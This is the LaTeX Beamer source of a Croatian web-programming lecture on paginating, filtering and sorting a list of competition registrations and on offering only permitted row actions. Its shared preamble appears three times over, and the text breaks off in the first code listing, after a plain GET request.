% !TeX program = lualatex
% !TeX root = predavanje10.tex
% ============================================================
% Zajednički preamble za sva predavanja RWA kolegija
% Uključiti s: % ============================================================
% Zajednički preamble za sva predavanja RWA kolegija
% Uključiti s: % ============================================================
% Zajednički preamble za sva predavanja RWA kolegija
% Uključiti s: \input{../common/preamble.tex}
% ============================================================

\documentclass[aspectratio=149,11pt]{beamer}
\usetheme{CambridgeUS}

\usepackage{fontspec}              % radi samo sa XeLaTeX/LuaLaTeX
\usepackage[croatian]{babel}
\usepackage{csquotes}              % \enquote{} → hrvatski navodnici „..."
\usepackage{booktabs}
\usepackage{array}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{hyperref}
\usepackage{tikz}
\usetikzlibrary{positioning,arrows.meta}

% ---------- Tipografija: IBM Plex ----------
\setsansfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmainfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmonofont{IBMPlexMono}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic,
  Scale          = 0.92
]

% ---------- Paleta ----------
\definecolor{ink}{HTML}{0C4685}      % primarna tamnoplava
\definecolor{ink2}{HTML}{6E7BAA}     % sekundarna plavo-siva
\definecolor{tint}{HTML}{EAEEF6}     % svjetli plavi tint
\definecolor{textclr}{HTML}{1A222E}  % glavni tekst
\definecolor{mutedclr}{HTML}{6B7484} % podnožje, sekundarni tekst
\definecolor{bgclr}{HTML}{F6F7F9}    % pozadina slajda
\definecolor{lineclr}{HTML}{D9DEE7}  % tanke linije tablica
\definecolor{divrule}{HTML}{9DB4D6}  % akcent na tamnim sekcijskim slajdovima
\definecolor{divtext}{HTML}{E6ECF6}  % tekst na tamnim sekcijskim slajdovima

\setbeamercolor{normal text}{fg=textclr,bg=bgclr}
\setbeamercolor{structure}{fg=ink}
\setbeamercolor{alerted text}{fg=ink}

\setbeamercolor{title}{fg=ink,bg=tint}
\setbeamercolor{subtitle}{fg=mutedclr}
\setbeamercolor{author}{fg=textclr}
\setbeamercolor{date}{fg=mutedclr}
\setbeamercolor{frametitle}{fg=ink,bg=tint}

\setbeamercolor{section in head/foot}{fg=white,bg=ink}
\setbeamercolor{subsection in head/foot}{fg=ink,bg=tint}
\setbeamercolor{author in head/foot}{fg=white,bg=ink}
\setbeamercolor{title in head/foot}{fg=textclr,bg=tint}
\setbeamercolor{date in head/foot}{fg=mutedclr,bg=tint}

\setbeamercolor{block title}{fg=white,bg=ink}
\setbeamercolor{block body}{fg=textclr,bg=tint}
\setbeamercolor{block title example}{fg=white,bg=ink2}
\setbeamercolor{block body example}{fg=textclr,bg=tint}
\setbeamercolor{itemize item}{fg=ink2}
\setbeamercolor{itemize subitem}{fg=ink2}
\setbeamercolor{enumerate item}{fg=ink2}

\setbeamertemplate{itemize items}[square]
\setbeamertemplate{navigation symbols}{}
\arrayrulecolor{lineclr}

% ---------- Kolegij, autori i logo ----------
\newcommand{\kolegij}{Programiranje za web}
\author{doc.\,dr.\,sc. Tomislav Petković \and mag.\,ing. Josip Torić}
\newcommand{\znak}[2]{\raisebox{-0.5\height}{\includegraphics[height=#1]{#2}}}
\titlegraphic{\znak{2.1cm}{../common/SIT_logo_tekst1.pdf}\hspace{1.8em}\znak{1.8cm}{../common/UNIZD_logo.pdf}}

% ---------- Zaglavlje ----------
% Jedna puna traka: lijevo sekcija, desno podsekcija.
\setbeamertemplate{headline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=\paperwidth,ht=2.25ex,dp=1ex,leftskip=.3cm,rightskip=.3cm]{section in head/foot}%
      \usebeamerfont{section in head/foot}\insertsectionhead\hfill\insertsubsectionhead%
    \end{beamercolorbox}%
  }%
}

% ---------- Podnožje ----------
% Lijevo: naziv trenutne prezentacije (kratki oblik naslova iz \title[...]{...})
% Sredina: naziv kolegija.  Desno: datum i redni broj slajda.
\setbeamertemplate{footline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=.34\paperwidth,ht=2.25ex,dp=1ex,center]{author in head/foot}%
      \usebeamerfont{author in head/foot}\insertshorttitle%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{title in head/foot}%
      \usebeamerfont{title in head/foot}\kolegij%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{date in head/foot}%
      \usebeamerfont{date in head/foot}\insertshortdate{}\hspace*{2em}%
      \insertframenumber{}\,/\,\inserttotalframenumber\hspace*{1ex}%
    \end{beamercolorbox}%
  }%
  \vskip0pt%
}

% ---------- Sekcijski slajd ----------
% \sekcija{Naslov sekcije}{jedna linija koja nabraja teme sekcije}
\newcommand{\sekcija}[2]{%
  \section{#1}%
  {%
    \setbeamercolor{background canvas}{bg=ink}%
    \setbeamertemplate{headline}{}%
    \begin{frame}
      \vfill
      \hspace*{0.03\textwidth}{\color{divrule}\rule{2.6cm}{1.1pt}}\par
      \vskip 0.7em
      \hspace*{0.03\textwidth}{\Large\bfseries\color{white}#1}\par
      \vskip 0.6em
      \hspace*{0.03\textwidth}\begin{minipage}{0.9\textwidth}\color{divtext}\small #2\end{minipage}\par
      \vfill
    \end{frame}%
  }%
}

% ---------- Listings ----------
\lstdefinelanguage{bash}{
  morekeywords={sudo,apt,brew,pip,pipx,uv,winget,python,git,flask,source,deactivate,code,gunicorn,docker,compose,heroku,render,railway,node,npm,pnpm,yarn,uvicorn,alembic,pytest,ruff,black,precommit},
  sensitive=false,
  morecomment=[l]{\#}
}
\lstdefinelanguage{python}{
  morekeywords={from,import,def,class,return,if,elif,else,for,in,while,try,except,raise,with,as,not,and,or,is,lambda,yield,True,False,None,await,async},
  sensitive=true,
  morecomment=[l]{\#},
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{sql}{
  morekeywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,CREATE,TABLE,PRIMARY,KEY,FOREIGN,REFERENCES,UNIQUE,NOT,NULL,INDEX,ON,ALTER,DROP,CONSTRAINT},
  sensitive=false,
  morecomment=[l]{--}
}
\lstdefinelanguage{json}{
  morecomment=[l]{//},
  morestring=[b]",
  showstringspaces=false
}
\lstdefinelanguage{typescript}{
  morekeywords={import,export,from,const,let,var,function,return,if,else,for,of,in,while,switch,case,break,async,await,try,catch,finally,throw,new,class,this,extends,implements,interface,type,enum,readonly,public,private,protected,static,get,set,true,false,null,undefined,void,string,number,boolean,any,unknown,never,typeof,keyof,as},
  sensitive=true,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/},
  morestring=[b]',
  morestring=[b]",
  morestring=[b]`
}
\lstalias{javascript}{typescript}
\lstset{
  backgroundcolor=\color{tint},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{ink}\bfseries,
  commentstyle=\color{mutedclr},
  frame=single,
  rulecolor=\color{lineclr},
  frameround=tttt,
  breaklines=true,
  tabsize=2,
  showstringspaces=false,
  upquote=true,
  columns=fullflexible,
  escapeinside={<@}{@>}
}
% ---------- Dijakritici u isječcima koda ----------
% listings čita bajt po bajt, pa višebajtni znak premjesti: "početni" ispadne
% "čpoetni". literate to ne popravlja. Rješenje je izlaz u LaTeX: sve između
% <@ i @> ne prolazi kroz listings, nego se slaže kao običan tekst, a unutar
% okvira je font ionako ttfamily, pa se ništa ne razlikuje.
%
%   async def get(...):
%       club = await repo.get_by_id(db, club_id)   <@\kom{dohvat kluba}@>
%       raise AppError("not_found", <@"Klub nije pronađen"@>, 404)
%
% Graničnici <@ i @> odabrani su jer se ne pojavljuju ni u jednom jeziku
% koji se na predavanjima citira; (* bi se sudaralo s def f(*args).
\newcommand{\kom}[1]{{\color{mutedclr}\# #1}}
% Isto za TypeScript, Vue i CSS, kojima komentar počinje s //:
%   const lifters = useLiftersStore()   <@\komts{dijeljeni popis}@>
\newcommand{\komts}[1]{{\color{mutedclr}// #1}}

% ---------- Činjenica naspram konvencije ----------
% Sve što nije propisano standardom ili jezikom, nego je dogovor struke,
% ide u ovaj okvir, da student zna koje je vrste tvrdnja pred njim.
% \begin{konvencija} ... \end{konvencija}
% \begin{konvencija}[Konvencija: nazivi putanja] ... \end{konvencija}
\newenvironment{konvencija}[1][Konvencija]
  {\begin{exampleblock}{#1}}
  {\end{exampleblock}}

% ---------- Helper macros ----------
% Stupac tablice zadane širine, poravnat ulijevo (bez rastezanja i dijeljenja riječi).
\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
\newcommand{\codefile}[1]{\texttt{#1}}
\newcommand{\kbd}[1]{\texttt{#1}}

% ---------- Code frame environment ----------
% Automatski dodaje fragile i shrink=5, koristi se umjesto \begin{frame}
% Primjer: \begin{codeframe}{Naslov} ... \end{codeframe}
% Primjer s opcijama: \begin{codeframe}[shrink=15]{Naslov} ... \end{codeframe}
\newenvironment{codeframe}[2][]
  {\begin{frame}[fragile,shrink=5,#1]{#2}}
  {\end{frame}}

% ============================================================

\documentclass[aspectratio=149,11pt]{beamer}
\usetheme{CambridgeUS}

\usepackage{fontspec}              % radi samo sa XeLaTeX/LuaLaTeX
\usepackage[croatian]{babel}
\usepackage{csquotes}              % \enquote{} → hrvatski navodnici „..."
\usepackage{booktabs}
\usepackage{array}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{hyperref}
\usepackage{tikz}
\usetikzlibrary{positioning,arrows.meta}

% ---------- Tipografija: IBM Plex ----------
\setsansfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmainfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmonofont{IBMPlexMono}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic,
  Scale          = 0.92
]

% ---------- Paleta ----------
\definecolor{ink}{HTML}{0C4685}      % primarna tamnoplava
\definecolor{ink2}{HTML}{6E7BAA}     % sekundarna plavo-siva
\definecolor{tint}{HTML}{EAEEF6}     % svjetli plavi tint
\definecolor{textclr}{HTML}{1A222E}  % glavni tekst
\definecolor{mutedclr}{HTML}{6B7484} % podnožje, sekundarni tekst
\definecolor{bgclr}{HTML}{F6F7F9}    % pozadina slajda
\definecolor{lineclr}{HTML}{D9DEE7}  % tanke linije tablica
\definecolor{divrule}{HTML}{9DB4D6}  % akcent na tamnim sekcijskim slajdovima
\definecolor{divtext}{HTML}{E6ECF6}  % tekst na tamnim sekcijskim slajdovima

\setbeamercolor{normal text}{fg=textclr,bg=bgclr}
\setbeamercolor{structure}{fg=ink}
\setbeamercolor{alerted text}{fg=ink}

\setbeamercolor{title}{fg=ink,bg=tint}
\setbeamercolor{subtitle}{fg=mutedclr}
\setbeamercolor{author}{fg=textclr}
\setbeamercolor{date}{fg=mutedclr}
\setbeamercolor{frametitle}{fg=ink,bg=tint}

\setbeamercolor{section in head/foot}{fg=white,bg=ink}
\setbeamercolor{subsection in head/foot}{fg=ink,bg=tint}
\setbeamercolor{author in head/foot}{fg=white,bg=ink}
\setbeamercolor{title in head/foot}{fg=textclr,bg=tint}
\setbeamercolor{date in head/foot}{fg=mutedclr,bg=tint}

\setbeamercolor{block title}{fg=white,bg=ink}
\setbeamercolor{block body}{fg=textclr,bg=tint}
\setbeamercolor{block title example}{fg=white,bg=ink2}
\setbeamercolor{block body example}{fg=textclr,bg=tint}
\setbeamercolor{itemize item}{fg=ink2}
\setbeamercolor{itemize subitem}{fg=ink2}
\setbeamercolor{enumerate item}{fg=ink2}

\setbeamertemplate{itemize items}[square]
\setbeamertemplate{navigation symbols}{}
\arrayrulecolor{lineclr}

% ---------- Kolegij, autori i logo ----------
\newcommand{\kolegij}{Programiranje za web}
\author{doc.\,dr.\,sc. Tomislav Petković \and mag.\,ing. Josip Torić}
\newcommand{\znak}[2]{\raisebox{-0.5\height}{\includegraphics[height=#1]{#2}}}
\titlegraphic{\znak{2.1cm}{../common/SIT_logo_tekst1.pdf}\hspace{1.8em}\znak{1.8cm}{../common/UNIZD_logo.pdf}}

% ---------- Zaglavlje ----------
% Jedna puna traka: lijevo sekcija, desno podsekcija.
\setbeamertemplate{headline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=\paperwidth,ht=2.25ex,dp=1ex,leftskip=.3cm,rightskip=.3cm]{section in head/foot}%
      \usebeamerfont{section in head/foot}\insertsectionhead\hfill\insertsubsectionhead%
    \end{beamercolorbox}%
  }%
}

% ---------- Podnožje ----------
% Lijevo: naziv trenutne prezentacije (kratki oblik naslova iz \title[...]{...})
% Sredina: naziv kolegija.  Desno: datum i redni broj slajda.
\setbeamertemplate{footline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=.34\paperwidth,ht=2.25ex,dp=1ex,center]{author in head/foot}%
      \usebeamerfont{author in head/foot}\insertshorttitle%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{title in head/foot}%
      \usebeamerfont{title in head/foot}\kolegij%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{date in head/foot}%
      \usebeamerfont{date in head/foot}\insertshortdate{}\hspace*{2em}%
      \insertframenumber{}\,/\,\inserttotalframenumber\hspace*{1ex}%
    \end{beamercolorbox}%
  }%
  \vskip0pt%
}

% ---------- Sekcijski slajd ----------
% \sekcija{Naslov sekcije}{jedna linija koja nabraja teme sekcije}
\newcommand{\sekcija}[2]{%
  \section{#1}%
  {%
    \setbeamercolor{background canvas}{bg=ink}%
    \setbeamertemplate{headline}{}%
    \begin{frame}
      \vfill
      \hspace*{0.03\textwidth}{\color{divrule}\rule{2.6cm}{1.1pt}}\par
      \vskip 0.7em
      \hspace*{0.03\textwidth}{\Large\bfseries\color{white}#1}\par
      \vskip 0.6em
      \hspace*{0.03\textwidth}\begin{minipage}{0.9\textwidth}\color{divtext}\small #2\end{minipage}\par
      \vfill
    \end{frame}%
  }%
}

% ---------- Listings ----------
\lstdefinelanguage{bash}{
  morekeywords={sudo,apt,brew,pip,pipx,uv,winget,python,git,flask,source,deactivate,code,gunicorn,docker,compose,heroku,render,railway,node,npm,pnpm,yarn,uvicorn,alembic,pytest,ruff,black,precommit},
  sensitive=false,
  morecomment=[l]{\#}
}
\lstdefinelanguage{python}{
  morekeywords={from,import,def,class,return,if,elif,else,for,in,while,try,except,raise,with,as,not,and,or,is,lambda,yield,True,False,None,await,async},
  sensitive=true,
  morecomment=[l]{\#},
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{sql}{
  morekeywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,CREATE,TABLE,PRIMARY,KEY,FOREIGN,REFERENCES,UNIQUE,NOT,NULL,INDEX,ON,ALTER,DROP,CONSTRAINT},
  sensitive=false,
  morecomment=[l]{--}
}
\lstdefinelanguage{json}{
  morecomment=[l]{//},
  morestring=[b]",
  showstringspaces=false
}
\lstdefinelanguage{typescript}{
  morekeywords={import,export,from,const,let,var,function,return,if,else,for,of,in,while,switch,case,break,async,await,try,catch,finally,throw,new,class,this,extends,implements,interface,type,enum,readonly,public,private,protected,static,get,set,true,false,null,undefined,void,string,number,boolean,any,unknown,never,typeof,keyof,as},
  sensitive=true,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/},
  morestring=[b]',
  morestring=[b]",
  morestring=[b]`
}
\lstalias{javascript}{typescript}
\lstset{
  backgroundcolor=\color{tint},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{ink}\bfseries,
  commentstyle=\color{mutedclr},
  frame=single,
  rulecolor=\color{lineclr},
  frameround=tttt,
  breaklines=true,
  tabsize=2,
  showstringspaces=false,
  upquote=true,
  columns=fullflexible,
  escapeinside={<@}{@>}
}
% ---------- Dijakritici u isječcima koda ----------
% listings čita bajt po bajt, pa višebajtni znak premjesti: "početni" ispadne
% "čpoetni". literate to ne popravlja. Rješenje je izlaz u LaTeX: sve između
% <@ i @> ne prolazi kroz listings, nego se slaže kao običan tekst, a unutar
% okvira je font ionako ttfamily, pa se ništa ne razlikuje.
%
%   async def get(...):
%       club = await repo.get_by_id(db, club_id)   <@\kom{dohvat kluba}@>
%       raise AppError("not_found", <@"Klub nije pronađen"@>, 404)
%
% Graničnici <@ i @> odabrani su jer se ne pojavljuju ni u jednom jeziku
% koji se na predavanjima citira; (* bi se sudaralo s def f(*args).
\newcommand{\kom}[1]{{\color{mutedclr}\# #1}}
% Isto za TypeScript, Vue i CSS, kojima komentar počinje s //:
%   const lifters = useLiftersStore()   <@\komts{dijeljeni popis}@>
\newcommand{\komts}[1]{{\color{mutedclr}// #1}}

% ---------- Činjenica naspram konvencije ----------
% Sve što nije propisano standardom ili jezikom, nego je dogovor struke,
% ide u ovaj okvir, da student zna koje je vrste tvrdnja pred njim.
% \begin{konvencija} ... \end{konvencija}
% \begin{konvencija}[Konvencija: nazivi putanja] ... \end{konvencija}
\newenvironment{konvencija}[1][Konvencija]
  {\begin{exampleblock}{#1}}
  {\end{exampleblock}}

% ---------- Helper macros ----------
% Stupac tablice zadane širine, poravnat ulijevo (bez rastezanja i dijeljenja riječi).
\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
\newcommand{\codefile}[1]{\texttt{#1}}
\newcommand{\kbd}[1]{\texttt{#1}}

% ---------- Code frame environment ----------
% Automatski dodaje fragile i shrink=5, koristi se umjesto \begin{frame}
% Primjer: \begin{codeframe}{Naslov} ... \end{codeframe}
% Primjer s opcijama: \begin{codeframe}[shrink=15]{Naslov} ... \end{codeframe}
\newenvironment{codeframe}[2][]
  {\begin{frame}[fragile,shrink=5,#1]{#2}}
  {\end{frame}}

% ============================================================

\documentclass[aspectratio=149,11pt]{beamer}
\usetheme{CambridgeUS}

\usepackage{fontspec}              % radi samo sa XeLaTeX/LuaLaTeX
\usepackage[croatian]{babel}
\usepackage{csquotes}              % \enquote{} → hrvatski navodnici „..."
\usepackage{booktabs}
\usepackage{array}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{colortbl}
\usepackage{hyperref}
\usepackage{tikz}
\usetikzlibrary{positioning,arrows.meta}

% ---------- Tipografija: IBM Plex ----------
\setsansfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmainfont{IBMPlexSans}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic
]
\setmonofont{IBMPlexMono}[
  Extension      = .otf,
  UprightFont    = *-Regular,
  ItalicFont     = *-Italic,
  BoldFont       = *-SemiBold,
  BoldItalicFont = *-SemiBoldItalic,
  Scale          = 0.92
]

% ---------- Paleta ----------
\definecolor{ink}{HTML}{0C4685}      % primarna tamnoplava
\definecolor{ink2}{HTML}{6E7BAA}     % sekundarna plavo-siva
\definecolor{tint}{HTML}{EAEEF6}     % svjetli plavi tint
\definecolor{textclr}{HTML}{1A222E}  % glavni tekst
\definecolor{mutedclr}{HTML}{6B7484} % podnožje, sekundarni tekst
\definecolor{bgclr}{HTML}{F6F7F9}    % pozadina slajda
\definecolor{lineclr}{HTML}{D9DEE7}  % tanke linije tablica
\definecolor{divrule}{HTML}{9DB4D6}  % akcent na tamnim sekcijskim slajdovima
\definecolor{divtext}{HTML}{E6ECF6}  % tekst na tamnim sekcijskim slajdovima

\setbeamercolor{normal text}{fg=textclr,bg=bgclr}
\setbeamercolor{structure}{fg=ink}
\setbeamercolor{alerted text}{fg=ink}

\setbeamercolor{title}{fg=ink,bg=tint}
\setbeamercolor{subtitle}{fg=mutedclr}
\setbeamercolor{author}{fg=textclr}
\setbeamercolor{date}{fg=mutedclr}
\setbeamercolor{frametitle}{fg=ink,bg=tint}

\setbeamercolor{section in head/foot}{fg=white,bg=ink}
\setbeamercolor{subsection in head/foot}{fg=ink,bg=tint}
\setbeamercolor{author in head/foot}{fg=white,bg=ink}
\setbeamercolor{title in head/foot}{fg=textclr,bg=tint}
\setbeamercolor{date in head/foot}{fg=mutedclr,bg=tint}

\setbeamercolor{block title}{fg=white,bg=ink}
\setbeamercolor{block body}{fg=textclr,bg=tint}
\setbeamercolor{block title example}{fg=white,bg=ink2}
\setbeamercolor{block body example}{fg=textclr,bg=tint}
\setbeamercolor{itemize item}{fg=ink2}
\setbeamercolor{itemize subitem}{fg=ink2}
\setbeamercolor{enumerate item}{fg=ink2}

\setbeamertemplate{itemize items}[square]
\setbeamertemplate{navigation symbols}{}
\arrayrulecolor{lineclr}

% ---------- Kolegij, autori i logo ----------
\newcommand{\kolegij}{Programiranje za web}
\author{doc.\,dr.\,sc. Tomislav Petković \and mag.\,ing. Josip Torić}
\newcommand{\znak}[2]{\raisebox{-0.5\height}{\includegraphics[height=#1]{#2}}}
\titlegraphic{\znak{2.1cm}{../common/SIT_logo_tekst1.pdf}\hspace{1.8em}\znak{1.8cm}{../common/UNIZD_logo.pdf}}

% ---------- Zaglavlje ----------
% Jedna puna traka: lijevo sekcija, desno podsekcija.
\setbeamertemplate{headline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=\paperwidth,ht=2.25ex,dp=1ex,leftskip=.3cm,rightskip=.3cm]{section in head/foot}%
      \usebeamerfont{section in head/foot}\insertsectionhead\hfill\insertsubsectionhead%
    \end{beamercolorbox}%
  }%
}

% ---------- Podnožje ----------
% Lijevo: naziv trenutne prezentacije (kratki oblik naslova iz \title[...]{...})
% Sredina: naziv kolegija.  Desno: datum i redni broj slajda.
\setbeamertemplate{footline}{%
  \leavevmode%
  \hbox{%
    \begin{beamercolorbox}[wd=.34\paperwidth,ht=2.25ex,dp=1ex,center]{author in head/foot}%
      \usebeamerfont{author in head/foot}\insertshorttitle%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{title in head/foot}%
      \usebeamerfont{title in head/foot}\kolegij%
    \end{beamercolorbox}%
    \begin{beamercolorbox}[wd=.33\paperwidth,ht=2.25ex,dp=1ex,center]{date in head/foot}%
      \usebeamerfont{date in head/foot}\insertshortdate{}\hspace*{2em}%
      \insertframenumber{}\,/\,\inserttotalframenumber\hspace*{1ex}%
    \end{beamercolorbox}%
  }%
  \vskip0pt%
}

% ---------- Sekcijski slajd ----------
% \sekcija{Naslov sekcije}{jedna linija koja nabraja teme sekcije}
\newcommand{\sekcija}[2]{%
  \section{#1}%
  {%
    \setbeamercolor{background canvas}{bg=ink}%
    \setbeamertemplate{headline}{}%
    \begin{frame}
      \vfill
      \hspace*{0.03\textwidth}{\color{divrule}\rule{2.6cm}{1.1pt}}\par
      \vskip 0.7em
      \hspace*{0.03\textwidth}{\Large\bfseries\color{white}#1}\par
      \vskip 0.6em
      \hspace*{0.03\textwidth}\begin{minipage}{0.9\textwidth}\color{divtext}\small #2\end{minipage}\par
      \vfill
    \end{frame}%
  }%
}

% ---------- Listings ----------
\lstdefinelanguage{bash}{
  morekeywords={sudo,apt,brew,pip,pipx,uv,winget,python,git,flask,source,deactivate,code,gunicorn,docker,compose,heroku,render,railway,node,npm,pnpm,yarn,uvicorn,alembic,pytest,ruff,black,precommit},
  sensitive=false,
  morecomment=[l]{\#}
}
\lstdefinelanguage{python}{
  morekeywords={from,import,def,class,return,if,elif,else,for,in,while,try,except,raise,with,as,not,and,or,is,lambda,yield,True,False,None,await,async},
  sensitive=true,
  morecomment=[l]{\#},
  morestring=[b]',
  morestring=[b]"
}
\lstdefinelanguage{sql}{
  morekeywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,CREATE,TABLE,PRIMARY,KEY,FOREIGN,REFERENCES,UNIQUE,NOT,NULL,INDEX,ON,ALTER,DROP,CONSTRAINT},
  sensitive=false,
  morecomment=[l]{--}
}
\lstdefinelanguage{json}{
  morecomment=[l]{//},
  morestring=[b]",
  showstringspaces=false
}
\lstdefinelanguage{typescript}{
  morekeywords={import,export,from,const,let,var,function,return,if,else,for,of,in,while,switch,case,break,async,await,try,catch,finally,throw,new,class,this,extends,implements,interface,type,enum,readonly,public,private,protected,static,get,set,true,false,null,undefined,void,string,number,boolean,any,unknown,never,typeof,keyof,as},
  sensitive=true,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/},
  morestring=[b]',
  morestring=[b]",
  morestring=[b]`
}
\lstalias{javascript}{typescript}
\lstset{
  backgroundcolor=\color{tint},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\color{ink}\bfseries,
  commentstyle=\color{mutedclr},
  frame=single,
  rulecolor=\color{lineclr},
  frameround=tttt,
  breaklines=true,
  tabsize=2,
  showstringspaces=false,
  upquote=true,
  columns=fullflexible,
  escapeinside={<@}{@>}
}
% ---------- Dijakritici u isječcima koda ----------
% listings čita bajt po bajt, pa višebajtni znak premjesti: "početni" ispadne
% "čpoetni". literate to ne popravlja. Rješenje je izlaz u LaTeX: sve između
% <@ i @> ne prolazi kroz listings, nego se slaže kao običan tekst, a unutar
% okvira je font ionako ttfamily, pa se ništa ne razlikuje.
%
%   async def get(...):
%       club = await repo.get_by_id(db, club_id)   <@\kom{dohvat kluba}@>
%       raise AppError("not_found", <@"Klub nije pronađen"@>, 404)
%
% Graničnici <@ i @> odabrani su jer se ne pojavljuju ni u jednom jeziku
% koji se na predavanjima citira; (* bi se sudaralo s def f(*args).
\newcommand{\kom}[1]{{\color{mutedclr}\# #1}}
% Isto za TypeScript, Vue i CSS, kojima komentar počinje s //:
%   const lifters = useLiftersStore()   <@\komts{dijeljeni popis}@>
\newcommand{\komts}[1]{{\color{mutedclr}// #1}}

% ---------- Činjenica naspram konvencije ----------
% Sve što nije propisano standardom ili jezikom, nego je dogovor struke,
% ide u ovaj okvir, da student zna koje je vrste tvrdnja pred njim.
% \begin{konvencija} ... \end{konvencija}
% \begin{konvencija}[Konvencija: nazivi putanja] ... \end{konvencija}
\newenvironment{konvencija}[1][Konvencija]
  {\begin{exampleblock}{#1}}
  {\end{exampleblock}}

% ---------- Helper macros ----------
% Stupac tablice zadane širine, poravnat ulijevo (bez rastezanja i dijeljenja riječi).
\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
\newcommand{\codefile}[1]{\texttt{#1}}
\newcommand{\kbd}[1]{\texttt{#1}}

% ---------- Code frame environment ----------
% Automatski dodaje fragile i shrink=5, koristi se umjesto \begin{frame}
% Primjer: \begin{codeframe}{Naslov} ... \end{codeframe}
% Primjer s opcijama: \begin{codeframe}[shrink=15]{Naslov} ... \end{codeframe}
\newenvironment{codeframe}[2][]
  {\begin{frame}[fragile,shrink=5,#1]{#2}}
  {\end{frame}}


\title[Predavanje 10: Tablice i filtri]{Programiranje za web \\ Predavanje 10: Tablice, filtri i radnje organizatora}
\date{17.12.2026.}

\begin{document}

\frame{\titlepage}

% ------------------------------------------------------------
\begin{frame}{Plan predavanja}
\begin{enumerate}
  \item Popis koji raste
  \item Sužavanje popisa
  \item Tablica i radnje nad retkom
  \item Korisničko sučelje koje poznaje pravila
\end{enumerate}

\vspace{0.6em}
Popis od desetak zapisa stane na zaslon i u jedan odgovor, a popis od nekoliko stotina ne stane ni u jedno. Predavanje gradi tablicu koja takav popis prikazuje po dijelovima i nudi samo one radnje koje poslužitelj u tom trenutku dopušta.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Ishodi učenja}
Nakon ovog predavanja student može:

\begin{itemize}
  \itemsep0.2em
  \item prikazati popis koji raste po stranicama i bez ukupnog broja zapisa odrediti postoji li sljedeća stranica
  \item zapisati stranicu i filtar u adresu, tako da ih zadrže osvježavanje, tipka Natrag i poslana poveznica
  \item odlučiti sužava li popis poslužitelj ili preglednik i reći koliki dio popisa svaki obuhvaća
  \item razvrstati i pretražiti hrvatska imena po pravilima jezika
  \item ponuditi radnju nad retkom samo kad je dopuštena, a uz onemogućenu navesti razlog
  \item zatražiti potvrdu prije radnje koja se ne može poništiti, dijalogom koji radi i s tipkovnicom
\end{itemize}
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Domena primjera}
Organizator otvara popis prijava na natjecanje. Na veće natjecanje prijavi se nekoliko stotina natjecatelja iz dvadesetak klubova, a svaka prijava ima natjecatelja, kategoriju, zbroj i stanje.

\vspace{0.9em}
Isti popis otvara i klub, ali vidi samo prijave svojih natjecatelja. Razliku provodi poslužitelj, pa je zahtjev s obje strane isti.

\vspace{0.9em}
Nad svakim retkom postoje radnje: odjava prijave i povratak odjavljene prijave. Je li radnja dopuštena, ovisi o razdoblju u kojem je natjecanje. Nakon konačnog roka prijave se više ne mijenjaju.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Nepotpun popis (I)}
Organizator otvara prijave na natjecanje na koje se prijavilo tristo natjecatelja. Prikaz šalje zahtjev bez parametara:

\begin{lstlisting}
GET /api/competitions/1/registrations/
